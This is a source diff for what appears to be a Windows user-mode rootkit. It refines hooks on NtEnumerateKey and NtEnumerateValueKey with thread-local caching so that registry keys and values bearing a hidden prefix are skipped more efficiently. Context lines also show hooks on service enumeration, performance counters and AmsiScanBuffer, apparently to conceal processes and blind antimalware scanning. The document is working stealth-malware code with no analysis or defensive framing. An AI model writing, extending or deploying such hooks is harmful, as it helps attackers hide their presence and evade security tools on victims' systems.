@@ -22,6 +22,13 @@ static NT_PDHGETRAWCOUNTERARRAYW OriginalPdhGetRawCounterArrayW;
 static NT_PDHGETFORMATTEDCOUNTERARRAYW OriginalPdhGetFormattedCounterArrayW;
 static NT_AMSISCANBUFFER OriginalAmsiScanBuffer;
 
+static DWORD NtEnumerateKeyCacheLastKey;
+static DWORD NtEnumerateKeyCacheLastIndex;
+static DWORD NtEnumerateKeyCacheHiddenCount;
+static DWORD NtEnumerateValueKeyCacheLastKey;
+static DWORD NtEnumerateValueKeyCacheLastIndex;
+static DWORD NtEnumerateValueKeyCacheHiddenCount;
+
 VOID InitializeHooks()
 {
 	DetourTransactionBegin();
@@ -46,6 +53,13 @@ VOID InitializeHooks()
 	// EnumServiceGroupW and EnumServicesStatusExW from advapi32.dll access services.exe through RPC.
 	// There is no longer one single syscall wrapper function to hook, but multiple higher level functions.
 	// EnumServicesStatusA and EnumServicesStatusExA also implement the RPC, but do not seem to be used by any applications out there.
+
+	NtEnumerateKeyCacheLastKey = TlsAlloc();
+	NtEnumerateKeyCacheLastIndex = TlsAlloc();
+	NtEnumerateKeyCacheHiddenCount = TlsAlloc();
+	NtEnumerateValueKeyCacheLastKey = TlsAlloc();
+	NtEnumerateValueKeyCacheLastIndex = TlsAlloc();
+	NtEnumerateValueKeyCacheHiddenCount = TlsAlloc();
 }
 VOID UninitializeHooks()
 {
@@ -65,6 +79,13 @@ VOID UninitializeHooks()
 	UninstallHook(OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	UninstallHook(OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
 	DetourTransactionCommit();
+
+	TlsFree(NtEnumerateKeyCacheLastKey);
+	TlsFree(NtEnumerateKeyCacheLastIndex);
+	TlsFree(NtEnumerateKeyCacheHiddenCount);
+	TlsFree(NtEnumerateValueKeyCacheLastKey);
+	TlsFree(NtEnumerateValueKeyCacheLastIndex);
+	TlsFree(NtEnumerateValueKeyCacheHiddenCount);
 }
 
 static VOID InstallHook(LPCSTR dll, LPCSTR function, LPVOID *originalFunction, LPVOID hookedFunction)
@@ -325,43 +346,143 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE eve
 }
 static NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFORMATION_CLASS keyInformationClass, LPVOID keyInformation, ULONG keyInformationLength, PULONG resultLength)
 {
-	NTSTATUS status = OriginalNtEnumerateKey(key, index, keyInformationClass, keyInformation, keyInformationLength, resultLength);
+	HANDLE cacheLastKey = (HANDLE)TlsGetValue(NtEnumerateKeyCacheLastKey);
+	ULONG cacheLastIndex = (ULONG)TlsGetValue(NtEnumerateKeyCacheLastIndex);
+	ULONG cacheHiddenCount = (ULONG)TlsGetValue(NtEnumerateKeyCacheHiddenCount);
 
-	// Implement hiding of registry keys by correcting the index in NtEnumerateKey.
-	if (status == ERROR_SUCCESS && (keyInformationClass == KeyBasicInformation || keyInformationClass == KeyNameInformation))
+	if (cacheLastKey == key && cacheLastIndex == index - 1)
 	{
-		for (ULONG i = 0, newIndex = 0; newIndex <= index && status == ERROR_SUCCESS; i++)
-		{
-			status = OriginalNtEnumerateKey(key, i, keyInformationClass, keyInformation, keyInformationLength, resultLength);
+		// This function was called the last time with index - 1, so we can continue from the last known position.
+		NTSTATUS status;
 
-			if (!HasPrefix(KeyInformationGetName(keyInformation, keyInformationClass)))
+		while (TRUE)
+		{
+			status = OriginalNtEnumerateKey(key, index + cacheHiddenCount, keyInformationClass, keyInformation, keyInformationLength, resultLength);
+			if (status == ERROR_SUCCESS && (keyInformationClass == KeyBasicInformation || keyInformationClass == KeyNameInformation))
 			{
-				newIndex++;
+				if (HasPrefix(KeyInformationGetName(keyInformation, keyInformationClass)))
+				{
+					cacheHiddenCount++;
+				}
+				else
+				{
+					break;
+				}
+			}
+			else
+			{
+				return status;
 			}
 		}
-	}
 
-	return status;
+		TlsSetValue(NtEnumerateKeyCacheLastKey, key);
+		TlsSetValue(NtEnumerateKeyCacheLastIndex, index);
+		TlsSetValue(NtEnumerateKeyCacheHiddenCount, cacheHiddenCount);
+
+		return status;
+	}
+	else
+	{
+		NTSTATUS status = OriginalNtEnumerateKey(key, index, keyInformationClass, keyInformation, keyInformationLength, resultLength);
+
+		// Implement hiding of registry keys by correcting the index in NtEnumerateKey.
+		if (status == ERROR_SUCCESS && (keyInformationClass == KeyBasicInformation || keyInformationClass == KeyNameInformation))
+		{
+			ULONG countHidden = 0;
+			for (ULONG i = 0, newIndex = 0; newIndex <= index && status == ERROR_SUCCESS; i++)
+			{
+				status = OriginalNtEnumerateKey(key, i, keyInformationClass, keyInformation, keyInformationLength, resultLength);
+
+				if (!HasPrefix(KeyInformationGetName(keyInformation, keyInformationClass)))
+				{
+					newIndex++;
+				}
+				else
+				{
+					countHidden++;
+				}
+			}
+
+			// Store this key and index in the cache, including the number of hidden keys prior to it,
+			// so we don't have to count all over again in the next iteration with index + 1.
+
+			TlsSetValue(NtEnumerateKeyCacheLastKey, key);
+			TlsSetValue(NtEnumerateKeyCacheLastIndex, index);
+			TlsSetValue(NtEnumerateKeyCacheHiddenCount, countHidden);
+		}
+
+		return status;
+	}
 }
 static NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength)
 {
-	NTSTATUS status = OriginalNtEnumerateValueKey(key, index, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
+	HANDLE cacheLastKey = (HANDLE)TlsGetValue(NtEnumerateValueKeyCacheLastKey);
+	ULONG cacheLastIndex = (ULONG)TlsGetValue(NtEnumerateValueKeyCacheLastIndex);
+	ULONG cacheHiddenCount = (ULONG)TlsGetValue(NtEnumerateValueKeyCacheHiddenCount);
 
-	// Implement hiding of registry values by correcting the index in NtEnumerateValueKey.
-	if (status == ERROR_SUCCESS && (keyValueInformationClass == KeyValueBasicInformation || keyValueInformationClass == KeyValueFullInformation))
+	if (cacheLastKey == key && cacheLastIndex == index - 1)
 	{
-		for (ULONG i = 0, newIndex = 0; newIndex <= index && status == ERROR_SUCCESS; i++)
-		{
-			status = OriginalNtEnumerateValueKey(key, i, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
+		// This function was called the last time with index - 1, so we can continue from the last known position.
+		NTSTATUS status;
 
-			if (!HasPrefix(KeyValueInformationGetName(keyValueInformation, keyValueInformationClass)))
+		while (TRUE)
+		{
+			status = OriginalNtEnumerateValueKey(key, index + cacheHiddenCount, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
+			if (status == ERROR_SUCCESS && (keyValueInformationClass == KeyValueBasicInformation || keyValueInformationClass == KeyValueFullInformation))
 			{
-				newIndex++;
+				if (HasPrefix(KeyValueInformationGetName(keyValueInformation, keyValueInformationClass)))
+				{
+					cacheHiddenCount++;
+				}
+				else
+				{
+					break;
+				}
+			}
+			else
+			{
+				return status;
 			}
 		}
-	}
 
-	return status;
+		TlsSetValue(NtEnumerateValueKeyCacheLastKey, key);
+		TlsSetValue(NtEnumerateValueKeyCacheLastIndex, index);
+		TlsSetValue(NtEnumerateValueKeyCacheHiddenCount, cacheHiddenCount);
+
+		return status;
+	}
+	else
+	{
+		NTSTATUS status = OriginalNtEnumerateValueKey(key, index, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
+
+		// Implement hiding of registry values by correcting the index in NtEnumerateValueKey.
+		if (status == ERROR_SUCCESS && (keyValueInformationClass == KeyValueBasicInformation || keyValueInformationClass == KeyValueFullInformation))
+		{
+			ULONG countHidden = 0;
+			for (ULONG i = 0, newIndex = 0; newIndex <= index && status == ERROR_SUCCESS; i++)
+			{
+				status = OriginalNtEnumerateValueKey(key, i, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
+
+				if (!HasPrefix(KeyValueInformationGetName(keyValueInformation, keyValueInformationClass)))
+				{
+					newIndex++;
+				}
+				else
+				{
+					countHidden++;
+				}
+			}
+
+			// Store this key and index in the cache, including the number of hidden values prior to it,
+			// so we don't have to count all over again in the next iteration with index + 1.
+
+			TlsSetValue(NtEnumerateValueKeyCacheLastKey, key);
+			TlsSetValue(NtEnumerateValueKeyCacheLastIndex, index);
+			TlsSetValue(NtEnumerateValueKeyCacheHiddenCount, countHidden);
+		}
+
+		return status;
+	}
 }
 static BOOL WINAPI HookedEnumServiceGroupW(SC_HANDLE serviceManager, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPVOID reserved)
 {
@@ -787,7 +908,7 @@ static DWORD GetProcessIdFromPdhString(LPCWSTR str)
 	// Parses a process ID from this type of string:
 	// "pid_1234_luid_0x00000000_0x0000C9DE_phys_0_eng_0_engtype_3D"
 
-	LPWSTR name = str;
+	LPCWSTR name = str;
 
 	if (!StrCmpNW(name, L"pid_", 4))
 	{
